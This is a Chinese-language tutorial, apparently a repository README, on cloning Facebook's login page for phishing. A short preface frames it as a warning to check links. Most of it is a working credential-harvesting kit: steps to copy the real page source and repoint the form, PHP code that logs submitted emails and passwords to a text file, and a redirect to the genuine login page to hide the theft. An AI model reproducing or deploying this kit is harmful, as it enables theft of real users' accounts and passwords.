# Facebook釣魚架設     

## 前言
此教程展示主要是要告訴大家，釣魚網站製作可以很簡單，所以大家在使用網頁時，針對可疑的連結不要輕易去點，網址記得要去查看是否為正確，或是把常用的連結弄成書籤，以避免被釣魚網站竊取帳密

## 影片展示
https://www.youtube.com/watch?v=t0YWDlTCjr4

##　製作過程
#### FB釣魚頁面製作(index.html)
先在真正的Facebook頁面按右鍵"檢視原始碼"

![](image/a.png)

把原始碼都複製下來

![](image/b.png)

貼在自己的index.html

然後用Ctrl+F 尋找"form"，把action後的內容改成login.php

![](image/c.PNG)

### php 後端程式編寫(login.php)
```php
<?php
$passwd = $_POST["pass"];
$account = $_POST["email"];
$data = fopen("logfile.txt","a+");
fwrite($data, "Username: $account\nPassword: $passwd\n");
fclose($data);
?>
<html>
<meta http-equiv="refresh" content="1;url=https://www.facebook.com/login.php">
<body>
Something goes wrong.Redirecting.......
</body>
</html>
```
```php
$passwd = $_POST["pass"];
$account = $_POST["email"];
```
以上帳號密碼的名稱可以從form表單得知
![](image/d.PNG)

以下為php語法，把前端輸入的帳號密碼寫到logfile.txt檔案裡
```php
$data = fopen("logfile.txt","a+");
fwrite($data, "Username: $account\nPassword: $passwd\n");
fclose($data);
```
跳轉到真正的FB頁面
```html
<meta http-equiv="refresh" content="1;url=https://www.facebook.com/login.php">
```